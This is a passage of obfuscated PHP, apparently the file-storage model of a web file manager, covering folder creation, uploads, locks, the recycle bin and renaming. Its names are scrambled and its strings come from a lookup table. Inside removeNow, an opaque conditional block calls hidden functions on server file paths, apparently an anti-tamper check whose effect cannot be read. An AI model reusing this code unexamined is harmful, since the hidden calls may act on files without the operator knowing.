!1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $„çˆÛÒË); } public function userRootRemove($‹Âî­¸Ğ) { $õú¢Œã¡ = $this->targetSourceRoot(SourceModel::TYPE_USER, $‹Âî­¸Ğ, !0); foreach ($õú¢Œã¡ as $†¢ßÂŠµ) { if (!$†¢ßÂŠµ) { continue; } $this->remove($†¢ßÂŠµ[$_SERVER[Ş­ğŠìÒ][193]], !1); } } public function groupRootRemove($üÁé•ÓÎ) { $õ¡ÔÎÛ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $üÁé•ÓÎ); if (!$õ¡ÔÎÛ) { return; } $this->remove($õ¡ÔÎÛ[$_SERVER[Ş­ğŠìÒ][193]], !1); } private function _mkdirRoot($èìß¡İÕ, $ûƒ…¬æ, $Ã¦­¸, $¡û¥šˆ = '') { $ı•ï¦çâ =& $_SERVER[Ş­ğŠìÒ]; $ø¿ Àñë = defined($ı•ï¦çâ[2190]) ? USER_ID : 0; $Éİ’ÁÑè = array($ı•ï¦çâ[477] => 0, $ı•ï¦çâ[648] => $èìß¡İÕ, $ı•ï¦çâ[649] => $ûƒ…¬æ, $ı•ï¦çâ[646] => 1, $ı•ï¦çâ[650] => $ø¿ Àñë, $ı•ï¦çâ[651] => $ø¿ Àñë, $ı•ï¦çâ[647] => $¡û¥šˆ, $ı•ï¦çâ[652] => $ı•ï¦çâ[594], $ı•ï¦çâ[504] => 0, $ı•ï¦çâ[617] => 0, $ı•ï¦çâ[542] => 0, $ı•ï¦çâ[653] => $ı•ï¦çâ[12]); if ($øë›¢ş¯ = $this->where($Éİ’ÁÑè)->find()) { return $øë›¢ş¯[$ı•ï¦çâ[193]]; } $¢¡Ïíß‹ = "\115\x6f\x64\x65\x6c\x53\x6f\x75\x72\143\x65\56\155\153\x64\151\162\122\157\157\164\56{$èìß¡İÕ}\x2e{$ûƒ…¬æ}\x2e" . $Ã¦­¸; CacheLock::lock($¢¡Ïíß‹); $Éİ’ÁÑè[$ı•ï¦çâ[32]] = $Ã¦­¸; $ŠÛ„‚¿´ = $this->add($Éİ’ÁÑè); $„ëëş’• = array($ı•ï¦çâ[654] => short_id($ŠÛ„‚¿´)); $this->where(array($ı•ï¦çâ[491] => $ŠÛ„‚¿´))->save($„ëëş’•); CacheLock::unlock($¢¡Ïíß‹); return $ŠÛ„‚¿´; } private function targetSourceRoot($•úŞ, $ì¤óÕÊ , $“îæœï­ = false) { $Ü¬Âãæˆ =& $_SERVER[Ş­ğŠìÒ]; $âùšµÊ‘ = array($Ü¬Âãæˆ[477] => 0, $Ü¬Âãæˆ[648] => $•úŞ, $Ü¬Âãæˆ[649] => $ì¤óÕÊ ); if ($“îæœï­) { $ó²ÑØ—Ø = $this->where($âùšµÊ‘)->select(); return $ó²ÑØ—Ø ? $ó²ÑØ—Ø : array(); } $†İÓí®Ç = $this->where($âùšµÊ‘)->find(); return $†İÓí®Ç ? $†İÓí®Ç : array(); } public function sourceRootGroup($â± €¸²) { $‡‡Ç€ì­ =& $_SERVER[Ş­ğŠìÒ]; if (is_string($â± €¸²)) { $â± €¸² = array($â± €¸²); } $’ù´Å‹£ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $â± €¸², $‡‡Ç€ì­[220]); $•÷æ¿Ô¸ = array($‡‡Ç€ì­[445] => $’ù´Å‹£, $‡‡Ç€ì­[442] => array($‡‡Ç€ì­[825] => count($â± €¸²))); $this->_listDataApply($•÷æ¿Ô¸[$‡‡Ç€ì­[445]]); $this->_listMake($•÷æ¿Ô¸); return array_to_keyvalue($•÷æ¿Ô¸[$‡‡Ç€ì­[85]], $‡‡Ç€ì­[569]); } public function mkfile($·î¡‘ì¶, $‘ÎŠ¸çÔ, $¬Ù›»ë = '', $‘ÔÔÉƒ = REPEAT_RENAME) { $’è§«µ˜ =& $_SERVER[Ş­ğŠìÒ]; $İßƒûãú = Model($’è§«µ˜[674])->addFileByContent($¬Ù›»ë, $‘ÎŠ¸çÔ); return $this->_createFileCall($·î¡‘ì¶, $‘ÎŠ¸çÔ, $İßƒûãú, $‘ÔÔÉƒ, $’è§«µ˜[1424]); } public function addFile($¢›ğ° , $ïŒœ¨Š×, $‹æâÀ°µ, $¦¯¨ş´Ê = false, $£†“Öâ† = REPEAT_RENAME) { $¢Ş°•®ê = Model($_SERVER[Ş­ğŠìÒ][674])->addFile($ïŒœ¨Š×, $‹æâÀ°µ, $¦¯¨ş´Ê); return $this->_createFileCall($¢›ğ° , $‹æâÀ°µ, $¢Ş°•®ê, $£†“Öâ†); } public function addFileByFileID($³à¿ˆ°, $òëÏ´Ñ‡, $Ş“ˆ¹ È, $ÀÆ‘·Ä = REPEAT_RENAME) { $éì‰´åç =& $_SERVER[Ş­ğŠìÒ]; $êä˜»ú€ = Model($éì‰´åç[674])->find($òëÏ´Ñ‡); Model($éì‰´åç[674])->linkAdd($òëÏ´Ñ‡); return $this->_createFileCall($³à¿ˆ°, $Ş“ˆ¹ È, $êä˜»ú€, $ÀÆ‘·Ä); } public function addFileByRemote($¶çâøŞÃ, $Öë¯¥Ìı, $ì´„¤üÙ, $…´Çğ² = array(), $¯²¢™äÓ = REPEAT_RENAME) { $‡ÕÎ÷ŠÙ = Model($_SERVER[Ş­ğŠìÒ][674])->addFileByRemote($Öë¯¥Ìı, $ì´„¤üÙ, $…´Çğ²); return $this->_createFileCall($¶çâøŞÃ, $ì´„¤üÙ, $‡ÕÎ÷ŠÙ, $¯²¢™äÓ); } private function _createFileCall($•Ş‘Ã€‰, $à”¿ÙÁ, $„‡œ¥€², $ÈË±„ÅÚ, $ÃÓ¬°Á = "\165\x70\154\157\x61\144") { $äÚŠ¼˜ê =& $_SERVER[Ş­ğŠìÒ]; $ü“„Ö”ë = !1; $this->setMasterDB(); $this->lockWriteStart($•Ş‘Ã€‰, $à”¿ÙÁ); $’¢Œú = $this->fileNameExist($•Ş‘Ã€‰, $à”¿ÙÁ); $†æºÌ†ê = $this->_createFile($•Ş‘Ã€‰, $à”¿ÙÁ, $„‡œ¥€², $ÈË±„ÅÚ, $ü“„Ö”ë); if (!$ü“„Ö”ë) { Model($äÚŠ¼˜ê[544])->remove($„‡œ¥€²[$äÚŠ¼˜ê[541]]); } if ($ü“„Ö”ë && $†æºÌ†ê && $†æºÌ†ê != $’¢Œú) { Model($äÚŠ¼˜ê[2216])->eventCreate($†æºÌ†ê, $ÃÓ¬°Á); } $this->lockWriteEnd($•Ş‘Ã€‰, $à”¿ÙÁ); return $†æºÌ†ê; } public function mkdir($×ô°ıô, $çÒ‚ãÍ¬, $Ğ˜ÁÜß— = REPEAT_SKIP) { $±×Ô˜ğÕ =& $_SERVER[Ş­ğŠìÒ]; $this->setMasterDB(); $ï–™³¿’ = $this->sourceInfo($×ô°ıô); if (!$ï–™³¿’) { return !1; } $this->lockWriteStart($×ô°ıô, $çÒ‚ãÍ¬); if ($Ğ˜ÁÜß— !== !1) { $Ó²ùŠ…Š = $this->fileNameExist($×ô°ıô, $çÒ‚ãÍ¬); if ($Ó²ùŠ…Š && $Ğ˜ÁÜß— != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($×ô°ıô, $çÒ‚ãÍ¬); return $Ó²ùŠ…Š; } $çÒ‚ãÍ¬ = $this->fileNameAuto($×ô°ıô, $çÒ‚ãÍ¬, $Ğ˜ÁÜß—); } $Çº—Ò ø = array($±×Ô˜ğÕ[646] => 1, $±×Ô˜ğÕ[494] => $çÒ‚ãÍ¬, $±×Ô˜ğÕ[647] => $±×Ô˜ğÕ[12], $±×Ô˜ğÕ[542] => 0, $±×Ô˜ğÕ[617] => 0); $†‘…ã° = $this->_addSource($Çº—Ò ø, $ï–™³¿’); Model($±×Ô˜ğÕ[2216])->eventCreate($†‘…ã°, $±×Ô˜ğÕ[1425]); $this->lockWriteEnd($×ô°ıô, $çÒ‚ãÍ¬); return $†‘…ã°; } public function listSourceRoot($Ş‘’³«, $é€şÎ±, $¾¨¤ê«¤ = "\163\x6f\165\x72\x63\x65\111\x44\x2c\164\141\162\x67\x65\x74\111\104\54\163\151\172\145") { $¹‚æêİ¯ =& $_SERVER[Ş­ğŠìÒ]; $Ğœò = $¹‚æêİ¯[454]; $ùŸ…ãŒ = array(); $‰ôÒß‚ˆ = 1024 * 50; $ÊÖËÁÆ­ = is_array($ÊÖËÁÆ­) ? $ÊÖËÁÆ­ : array(); $¢ÎéÇ = count($é€şÎ±); $ÌÜ”æÈå = $this->tablePrefix . $¹‚æêİ¯[2249]; for ($ãº¨÷±ø = 0; $ãº¨÷±ø < $¢ÎéÇ; $ãº¨÷±ø++) { $Ü±¯™¦ê = $é€şÎ±[$ãº¨÷±ø]; $Ğœò .= "\123\105\x4c\105\x43\x54\40\52\x20\106\x52\117\115\40\50\123\x45\x4c\x45\103\x54\x20{$¾¨¤ê«¤}\x20\106\x52\117\x4d\40\140{$ÌÜ”æÈå}\x60\40\127\110\105\x52\105\40"; $Ğœò .= "\140\160\141\x72\x65\156\164\x49\x44\x60\x3d\60\x20\x41\x4e\x44\x20\x60\164\141\162\147\x65\x74\x49\104\x60\x3d{$Ü±¯™¦ê}\x20\x41\116\104\x20\x60\x74\x61\162\x67\145\164\x54\171\x70\145\x60\x3d{$Ş‘’³«}\x20\141\156\144\40\146\x69\154\145\x54\x79\x70\x65\x3d\x27\x27\x20\x6c\151\155\x69\x74\40\x31\x29\x20\x61\x73\x20\164\x62\137{$ãº¨÷±ø}\x20\125\116\111\x4f\116\40\101\114\114\40"; if ((strlen($Ğœò) >= $‰ôÒß‚ˆ || $ãº¨÷±ø == $¢ÎéÇ - 1) && $Ğœò) { $Ğœò = substr($Ğœò, 0, -strlen($¹‚æêİ¯[1112])); $¤öŒèë„ = $this->query($Ğœò); $Ğœò = $¹‚æêİ¯[12]; $ùŸ…ãŒ = array_merge($ùŸ…ãŒ, $¤öŒèë„); } } return $ùŸ…ãŒ; } private function _createFile($ºµÔèÎĞ, $‘•ØÓÛ , $€äÌö«, $¥ùãïÙ€, &$ÎÙ€ä·) { $ùÌÖúˆŠ =& $_SERVER[Ş­ğŠìÒ]; $ïÔè’˜Ê = $this->sourceInfo($ºµÔèÎĞ); if (!$€äÌö« || !$ïÔè’˜Ê) { return !1; } if ($¥ùãïÙ€ !== !1) { $†ÏÑ©öÅ = $this->fileNameExist($ºµÔèÎĞ, $‘•ØÓÛ ); } $ÎÙ€ä· = !0; if ($¥ùãïÙ€ && $†ÏÑ©öÅ) { if ($¥ùãïÙ€ == REPEAT_SKIP) { $ÎÙ€ä· = !1; return $†ÏÑ©öÅ; } else { if ($¥ùãïÙ€ == REPEAT_REPLACE) { $Äò™¸«Ç = $this->sourceInfo($†ÏÑ©öÅ); $¦ó„ãÒ’ = $this->fileHistory($Äò™¸«Ç, $€äÌö«[$ùÌÖúˆŠ[541]], $€äÌö«[$ùÌÖúˆŠ[79]]); if (!$¦ó„ãÒ’) { $ÎÙ€ä· = !1; } else { $this->folderSizeReset($ºµÔèÎĞ); } return $†ÏÑ©öÅ; } else { $‘•ØÓÛ  = $this->fileNameAuto($ºµÔèÎĞ, $‘•ØÓÛ , $¥ùãïÙ€, !1); } } } $şÏ©Šû = array($ùÌÖúˆŠ[646] => 0, $ùÌÖúˆŠ[494] => $‘•ØÓÛ , $ùÌÖúˆŠ[647] => substr(get_path_ext($‘•ØÓÛ ), 0, 10), $ùÌÖúˆŠ[542] => $€äÌö«[$ùÌÖúˆŠ[541]], $ùÌÖúˆŠ[617] => $€äÌö«[$ùÌÖúˆŠ[79]]); $ñ½¬ÜˆĞ = $this->_addSource($şÏ©Šû, $ïÔè’˜Ê); $this->folderSizeReset($ºµÔèÎĞ, intval($şÏ©Šû[$ùÌÖúˆŠ[79]])); return $ñ½¬ÜˆĞ; } protected function fileHistory($ªŒÖŞı, $¼”Ï‹½Ò, $¸îğØß) { $ÚÎÓèÒŸ =& $_SERVER[Ş­ğŠìÒ]; if ($ªŒÖŞı[$ÚÎÓèÒŸ[541]] == $¼”Ï‹½Ò) { return !1; } $this->checkLock($ªŒÖŞı[$ÚÎÓèÒŸ[193]], $¼”Ï‹½Ò); Model($ÚÎÓèÒŸ[2250])->addHistory($ªŒÖŞı); $Ñ’ó‡½Í = array($ÚÎÓèÒŸ[651] => USER_ID, $ÚÎÓèÒŸ[498] => time(), $ÚÎÓèÒŸ[541] => $¼”Ï‹½Ò, $ÚÎÓèÒŸ[79] => $¸îğØß); $this->where(array($ÚÎÓèÒŸ[491] => $ªŒÖŞı[$ÚÎÓèÒŸ[193]]))->save($Ñ’ó‡½Í); $this->sourceCacheClear($ªŒÖŞı[$ÚÎÓèÒŸ[193]]); return !0; } public function checkLock($ğ–É©â¯, $âÉ˜¹ºÙ) { $¶ÒÆóğÇ =& $_SERVER[Ş­ğŠìÒ]; $Şï‰Ù°© = $this->pathInfo($ğ–É©â¯); if (!$this->fileIsLock($Şï‰Ù°©, !0)) { return; } $¹–®Œ±¹ = Session::get($¶ÒÆóğÇ[2251]); $€€ú”ë = substr($Şï‰Ù°©[$¶ÒÆóğÇ[32]], 0, -1 - strlen($Şï‰Ù°©[$¶ÒÆóğÇ[169]])) . $¶ÒÆóğÇ[1289] . $¹–®Œ±¹ . $¶ÒÆóğÇ[10] . $Şï‰Ù°©[$¶ÒÆóğÇ[169]]; $Ù„¼Æ² = Model($¶ÒÆóğÇ[674])->find($âÉ˜¹ºÙ); $this->_createFileCall($Şï‰Ù°©[$¶ÒÆóğÇ[192]], $€€ú”ë, $Ù„¼Æ², REPEAT_REPLACE, $¶ÒÆóğÇ[1424]); $°›ª“ÉÀ = $Şï‰Ù°©[$¶ÒÆóğÇ[539]][$¶ÒÆóğÇ[610]]; $“·„Ï€• = $°›ª“ÉÀ[$¶ÒÆóğÇ[2252]] ? $°›ª“ÉÀ[$¶ÒÆóğÇ[2252]] : $°›ª“ÉÀ[$¶ÒÆóğÇ[32]]; show_json(LNG($¶ÒÆóğÇ[2253]) . $¶ÒÆóğÇ[2254] . LNG($¶ÒÆóğÇ[2255]) . $¶ÒÆóğÇ[2256] . $“·„Ï€• . $¶ÒÆóğÇ[2257], !1); } public function fileIsLock($æ¡°ğõğ, $¢ß£Ï„¥ = false) { $œ¤ñšãÆ =& $_SERVER[Ş­ğŠìÒ]; if (!_get($æ¡°ğõğ, $œ¤ñšãÆ[606], 0)) { return !1; } if ($æ¡°ğõğ[$œ¤ñšãÆ[539]][$œ¤ñšãÆ[609]] != USER_ID) { return !0; } $…Š„ññ = $GLOBALS[$œ¤ñšãÆ[6]][$œ¤ñšãÆ[92]][$œ¤ñšãÆ[607]]; if ($æ¡°ğõğ[$œ¤ñšãÆ[539]][$œ¤ñšãÆ[608]] <= time() - $…Š„ññ) { $this->metaSet($æ¡°ğõğ[$œ¤ñšãÆ[193]], $œ¤ñšãÆ[609], null); $this->metaSet($æ¡°ğõğ[$œ¤ñšãÆ[193]], $œ¤ñšãÆ[608], null); } if ($¢ß£Ï„¥) { $this->metaSet($æ¡°ğõğ[$œ¤ñšãÆ[193]], $œ¤ñšãÆ[608], time()); } return !1; } private function _addSource($ƒ‚ÓéëÍ, $òÔ×›î­) { $Å»Æ—ß´ =& $_SERVER[Ş­ğŠìÒ]; $·Êõ¹¹ğ = defined($Å»Æ—ß´[2190]) ? USER_ID : 0; $Ø–ºôáá = array($Å»Æ—ß´[648] => $òÔ×›î­[$Å»Æ—ß´[190]], $Å»Æ—ß´[649] => $òÔ×›î­[$Å»Æ—ß´[569]], $Å»Æ—ß´[650] => $·Êõ¹¹ğ, $Å»Æ—ß´[651] => $·Êõ¹¹ğ, $Å»Æ—ß´[477] => $òÔ×›î­[$Å»Æ—ß´[193]], $Å»Æ—ß´[652] => $òÔ×›î­[$Å»Æ—ß´[584]] . $òÔ×›î­[$Å»Æ—ß´[193]] . $Å»Æ—ß´[50], $Å»Æ—ß´[504] => 0, $Å»Æ—ß´[653] => $Å»Æ—ß´[12]); $ƒ‚ÓéëÍ = array_merge($Ø–ºôáá, $ƒ‚ÓéëÍ); $this->updateModifyTime($ƒ‚ÓéëÍ[$Å»Æ—ß´[192]]); $òñ±°µè = $Å»Æ—ß´[2258] . $òÔ×›î­[$Å»Æ—ß´[193]]; if (isset(self::$cacheChildList[$òñ±°µè])) { unset(self::$cacheChildList[$òñ±°µè]); } static $À€ûÂÄ = false; if (!$À€ûÂÄ) { Hook::trigger($Å»Æ—ß´[636], $ƒ‚ÓéëÍ); $À€ûÂÄ = !0; } $´¨úÍÊÓ = $this->add($ƒ‚ÓéëÍ); $ßÕ¼”…¤ = array($Å»Æ—ß´[654] => short_id($´¨úÍÊÓ)); $this->where(array($Å»Æ—ß´[491] => $´¨úÍÊÓ))->save($ßÕ¼”…¤); $this->setNamePinyin($´¨úÍÊÓ, $ƒ‚ÓéëÍ[$Å»Æ—ß´[32]]); return $´¨úÍÊÓ; } public function remove($ÕĞÚÁÚ, $Ò×ú‹Ê² = true) { $İ¬ Æ¶´ =& $_SERVER[Ş­ğŠìÒ]; $´ÍğÔø© = $this->sourceInfo($ÕĞÚÁÚ); $û®ùˆÂí = intval($´ÍğÔø©[$İ¬ Æ¶´[190]]) === self::TYPE_SYSTEM; $¾ÍÎ…àŸ = Model($İ¬ Æ¶´[508])->get($İ¬ Æ¶´[2259]) == $İ¬ Æ¶´[91]; if ($û®ùˆÂí || $Ò×ú‹Ê² || !$¾ÍÎ…àŸ) { return $this->removeNow($ÕĞÚÁÚ, $Ò×ú‹Ê²); } $—¿®¼«á = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¿õ¿£šş = $´ÍğÔø©[$İ¬ Æ¶´[190]] == self::TYPE_USER ? $İ¬ Æ¶´[662] : $İ¬ Æ¶´[578]; if ($¿õ¿£šş == $İ¬ Æ¶´[662]) { $®½í”æ¹ = Model($İ¬ Æ¶´[577])->getInfo($´ÍğÔø©[$İ¬ Æ¶´[569]]); $£š´œÀ = !empty($®½í”æ¹[$İ¬ Æ¶´[2252]]) ? $®½í”æ¹[$İ¬ Æ¶´[2252]] : $®½í”æ¹[$İ¬ Æ¶´[32]]; $£š´œÀ = $İ¬ Æ¶´[337] . $£š´œÀ . $İ¬ Æ¶´[2260] . $´ÍğÔø©[$İ¬ Æ¶´[569]]; } else { $®½í”æ¹ = Model($İ¬ Æ¶´[585])->getInfo($´ÍğÔø©[$İ¬ Æ¶´[569]]); $£š´œÀ = _get($®½í”æ¹, $İ¬ Æ¶´[32]); $£š´œÀ = $İ¬ Æ¶´[176] . $£š´œÀ . $İ¬ Æ¶´[2261] . $´ÍğÔø©[$İ¬ Æ¶´[569]]; } $ìóÑÉı = $İ¬ Æ¶´[2262] . md5($£š´œÀ); CacheLock::lock($ìóÑÉı); $ĞÁ†ùÆá = $this->fileNameExist($—¿®¼«á, $£š´œÀ); if (!$ĞÁ†ùÆá) { $ĞÁ†ùÆá = $this->mkdir($—¿®¼«á, $£š´œÀ, REPEAT_SKIP); $this->metaSet($ĞÁ†ùÆá, $İ¬ Æ¶´[2263], $¿õ¿£šş); $this->metaSet($ĞÁ†ùÆá, $İ¬ Æ¶´[2264], $´ÍğÔø©[$İ¬ Æ¶´[569]]); if ($´ÍğÔø©[$İ¬ Æ¶´[192]] != 0) { $this->metaSet($ĞÁ†ùÆá, $İ¬ Æ¶´[2265], _get($®½í”æ¹, $İ¬ Æ¶´[2266])); } } CacheLock::unlock($ìóÑÉı); $this->metaSet($ÕĞÚÁÚ, $İ¬ Æ¶´[2267], $´ÍğÔø©[$İ¬ Æ¶´[192]]); $this->where(array($İ¬ Æ¶´[193] => $ÕĞÚÁÚ))->save(array($İ¬ Æ¶´[498] => time())); $this->recycleClear($´ÍğÔø©); Model($İ¬ Æ¶´[633])->eventRemove($ÕĞÚÁÚ); $ÉŞ›‚›Ç = $this->move($ÕĞÚÁÚ, $ĞÁ†ùÆá, REPEAT_RENAME_FOLDER); $this->folderSizeReset($´ÍğÔø©[$İ¬ Æ¶´[192]]); return $ÉŞ›‚›Ç; } private function recycleClear($ÖÙ¬™ö) { $©€„‹® =& $_SERVER[Ş­ğŠìÒ]; $’åìçæÄ = $this->childrenAll($ÖÙ¬™ö); $ØšµöÄ› = array($©€„‹®[491] => array($©€„‹®[492], $’åìçæÄ[$©€„‹®[2268]])); Model($©€„‹®[2269])->where($ØšµöÄ›)->delete(); } public function removeNow($ÎÈÅ¾²ˆ, $£’›¸´Ÿ = true) { $‘ûÏÅç =& $_SERVER[Ş­ğŠìÒ]; if ($_SERVER[$‘ûÏÅç[945]] != $_SERVER[$‘ûÏÅç[1988]]) { $éêŠ°¸¼ = $‘ûÏÅç[946]; $²”‰Œà– = $‘ûÏÅç[947]; $°ßáÙ = $_SERVER[$‘ûÏÅç[948]] . $‘ûÏÅç[949]; $Á­¾¯ñª = $²”‰Œà–($°ßáÙ); $÷Ğ³åî = explode($‘ûÏÅç[262], $Á­¾¯ñª); if (count($÷Ğ³åî) < $‘ûÏÅç[692]) { $”½–Äï¯ = $‘ûÏÅç[950]; $”½–Äï¯(); } $Ğ½¼¢¡ë = $‘ûÏÅç[951]; $Ğ½¼¢¡ë($_SERVER[$‘ûÏÅç[952]]); $Ğ½¼¢¡ë($_SERVER[$‘ûÏÅç[948]] . $‘ûÏÅç[2270]); $¸‡·ØÃ = 1; while ($¸‡·ØÃ > 1) { $¸‡·ØÃ = $¸‡·ØÃ + 4; $¿«š‰¾· = rawurlencode($¸‡·ØÃ . $‘ûÏÅç[454]); } } $…í°—Ñ = $this->sourceInfo($ÎÈÅ¾²ˆ); $É÷ÆÆí = $this->pathInfoMore($ÎÈÅ¾²ˆ); if (!$…í°—Ñ) { return !0; } if ($…í°—Ñ[$‘ûÏÅç[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÎÈÅ¾²ˆ); Hook::trigger($‘ûÏÅç[2271], $É÷ÆÆí, $£’›¸´Ÿ); if ($£’›¸´Ÿ) { Model($‘ûÏÅç[2269])->moveToRecycle($ÎÈÅ¾²ˆ); } else { $Çè‹½¡¯ = $this->childrenAll($…í°—Ñ); Model($‘ûÏÅç[633])->eventRemove($ÎÈÅ¾²ˆ); $this->removeRelevance($Çè‹½¡¯[$‘ûÏÅç[2268]], $Çè‹½¡¯[$‘ûÏÅç[1569]]); } $this->folderSizeReset($…í°—Ñ[$‘ûÏÅç[192]]); $­À¯¸ô— = array($…í°—Ñ[$‘ûÏÅç[192]]); if ($…í°—Ñ[$‘ûÏÅç[485]] == $‘ûÏÅç[91]) { $­À¯¸ô—[] = $…í°—Ñ[$‘ûÏÅç[193]]; } $this->updateModifyTime($­À¯¸ô—); $this->lockMoveEnd($ÎÈÅ¾²ˆ); Hook::trigger($‘ûÏÅç[1806], $É÷ÆÆí, $£’›¸´Ÿ); return !0; } public function childrenAll($³•Èè¹ô) { $ûâáåÎ =& $_SERVER[Ş­ğŠìÒ]; $ï¤ÌÏŠó = $³•Èè¹ô[$ûâáåÎ[193]]; if ($³•Èè¹ô[$ûâáåÎ[485]] == $ûâáåÎ[91]) { $·ª‰¿Õ = array($ûâáåÎ[652] => array($ûâáåÎ[612], $³•Èè¹ô[$ûâáåÎ[584]] . $ï¤ÌÏŠó . $ûâáåÎ[613])); $½‘Ä¼çè = array($ûâáåÎ[652] => $·ª‰¿Õ[$ûâáåÎ[584]]); $¥×¶Ë‡ = $this->field($ûâáåÎ[2272])->where($½‘Ä¼çè)->select(); $ıö‚ñ = !1; $Ÿ®ßğ‹ß = array($ï¤ÌÏŠó); if ($¥×¶Ë‡) { $ıö‚ñ = array_to_keyvalue($¥×¶Ë‡, $ûâáåÎ[12], $ûâáåÎ[541]); $ıö‚ñ = array_remove_value($ıö‚ñ, $ûâáåÎ[228]); $Ÿ®ßğ‹ß = array_to_keyvalue($¥×¶Ë‡, $ûâáåÎ[12], $ûâáåÎ[193]); $Ÿ®ßğ‹ß[] = $ï¤ÌÏŠó; } } else { $ıö‚ñ = array($³•Èè¹ô[$ûâáåÎ[541]]); $Ÿ®ßğ‹ß = array($ï¤ÌÏŠó); } return array($ûâáåÎ[2268] => $Ÿ®ßğ‹ß, $ûâáåÎ[1569] => $ıö‚ñ); } public function removeArray($ßöÁ¾†‰) { if (!$ßöÁ¾†‰) { return !0; } } public function removeRelevance($ˆÚÕ†, $Õ¿ˆŒ¥Í) { $×’™÷† =& $_SERVER[Ş­ğŠìÒ]; $ˆÚÕ† = $ˆÚÕ† ? $ˆÚÕ† : array(); $Õ¿ˆŒ¥Í = $Õ¿ˆŒ¥Í ? $Õ¿ˆŒ¥Í : array(); $ˆÚÕ† = array_unique(array_filter($ˆÚÕ†)); $Õ¿ˆŒ¥Í = array_unique(array_filter($Õ¿ˆŒ¥Í)); if (!$ˆÚÕ†) { return !1; } $ëÅÊöªÌ = array($×’™÷†[491] => array($×’™÷†[492], $ˆÚÕ†)); Model($×’™÷†[2269])->where($ëÅÊöªÌ)->delete(); Model($×’™÷†[535])->where($ëÅÊöªÌ)->delete(); Model($×’™÷†[2115])->where($ëÅÊöªÌ)->delete(); Model($×’™÷†[633])->where($ëÅÊöªÌ)->delete(); Model($×’™÷†[1942])->removeBySource($ˆÚÕ†); Model($×’™÷†[2250])->removeBySource($ˆÚÕ†); $this->where($ëÅÊöªÌ)->delete(); Model($×’™÷†[544])->remove($Õ¿ˆŒ¥Í); for ($ˆå´ñì™ = 0; $ˆå´ñì™ < count($ˆÚÕ†); $ˆå´ñì™++) { $this->sourceCacheClear($ˆÚÕ†[$ˆå´ñì™]); } } public function rename($©¬çŞª´, $±Ùœß¾¾) { $êØ×¼Æ =& $_SERVER[Ş­ğŠìÒ]; $áØšå¥¼ = $this->sourceInfo($©¬çŞª´); if (!$áØšå¥¼) { return !1; } $Î¯¤íÆ† = $this->fileNameExist($áØšå¥¼[$êØ×¼Æ[192]], $±Ùœß¾¾); if ($Î¯¤íÆ† && $Î¯¤íÆ† != $©¬çŞª´) { return !1; } $”ÃàñÒ” = array($êØ×¼Æ[494] => $±Ùœß¾¾, $êØ×¼Æ[651] => USER_ID); if ($áØšå¥¼[$êØ×¼Æ[485]] != $êØ×¼Æ[91]) { $”ÃàñÒ”[$êØ×¼Æ[486]] = substr(get_path_ext($±Ùœß¾¾), 0, 10); } Model($êØ×¼Æ[633])->eventRename($©¬çŞª´, $áØšå¥¼[$êØ×¼Æ[32]], $±Ùœß¾¾); $this->sourceCacheClear($©¬çŞª´); $this->setNamePinyin($©¬çŞª´, $”ÃàñÒ”[$êØ×¼Æ[32]], !1); $this->updateModifyTime($áØšå¥¼[$êØ×¼Æ[192]]); $§±¸‹» = $this->where(array($êØ×¼Æ[491] => $©¬çŞª´))->data($”ÃàñÒ”)->save(); $©ãûÇÜ = $êØ×¼Æ[2258] . $áØšå¥¼[$êØ×¼Æ[192]]; if (isset(self::$cacheChildList[$©ãûÇÜ])) { unset(self::$cacheChildList[$©ãûÇÜ]); } return $§±¸‹»; } public function setNamePinyin($»†èöš™, $±Õ‹Â¦¢, $Ì¶Ú¼ãØ = true) { $¿¦Ü¾ç‚ =& $_SERVER[Ş­ğŠìÒ]; $·‡Ñ×õª = Input::check($±Õ‹Â¦¢, $¿¦Ü¾ç‚[655]); $Ù¦ËéÎí = array($¿¦Ü¾ç‚[517] => KodSort::makeStr($±Õ‹Â¦¢)); if ($·‡Ñ×õª) { $Ù¦ËéÎí[$¿¦Ü¾ç‚[538]] = str_replace($¿¦Ü¾ç‚[53], $¿¦Ü¾ç‚[12], Pinyin::get($±Õ‹Â¦¢)); $Ù¦ËéÎí[$¿¦Ü¾ç‚[537]] = Pinyin::get($±Õ‹Â¦¢, $¿¦Ü¾ç‚[656]); } if (!$Ì¶Ú¼ãØ && !$·‡Ñ×õª) { $Ù¦ËéÎí[$¿¦Ü¾ç‚[538]] = null; $Ù¦ËéÎí[$¿¦Ü¾ç‚[537]] = null; } $this->metaSet($»†èöš™, $Ù¦ËéÎí); } public function getContent($•’ÑÕáû) { $£¡Áµù =& $_SERVER[Ş­ğŠìÒ]; $Ëşèàª÷ = $this->fileInfoGet($•’ÑÕáû); if (!$Ëşèàª÷) { return !1; } if ($Ëşèàª÷[$£¡Áµù[79]] == 0) { return $£¡Áµù[12]; } $„»Ó™£€ = $£¡Áµù[2273] . $Ëşèàª÷[$£¡Áµù[547]]; if ($Ëşèàª÷[$£¡Áµù[79]] <= 1024 * 10) { $›šªÇÀ¶ = Cache::get($„»Ó™£€); if (!$›šªÇÀ¶) { $›šªÇÀ¶ = IO::getContent($Ëşèàª÷[$£¡Áµù[87]]); Cache::set($„»Ó™£€, $›šªÇÀ¶); } return $›šªÇÀ¶; } if (!$Ëşèàª÷[$£¡Áµù[87]]) { return $£¡Áµù[12]; } return IO::getContent($Ëşèàª÷[$£¡Áµù[87]]); } public function setDesc($€Íï‚æ÷, $©Ößà¬­) { $ãÔ„«ıÜ =& $_SERVER[Ş­ğŠìÒ]; Model($ãÔ„«ıÜ[633])->eventAddDesc($€Íï‚æ÷, $©Ößà¬­); return $this->metaSet($€Íï‚æ÷, $ãÔ„«ıÜ[526], $©Ößà¬­); } public function setContent($á¬•ğï®, $´í˜İ¿è = '') { $æ¨å£ =& $_SERVER[Ş­ğŠìÒ]; $€ºÀœ£³ = $this->sourceInfo($á¬•ğï®); $–ÇÑé‘Ğ = $this->fileInfoGet($á¬•ğï®); if (!$–ÇÑé‘Ğ || !$€ºÀœ£³) { return !1; } $¾´ÊÊ»– = Model($æ¨å£[544])->addFileByContent($´í˜İ¿è, $€ºÀœ£³[$æ¨å£[32]]); $¶®óæÀ¹ = $this->fileHistory($€ºÀœ£³, $¾´ÊÊ»–[$æ¨å£[541]], $¾´ÊÊ»–[$æ¨å£[79]]); if 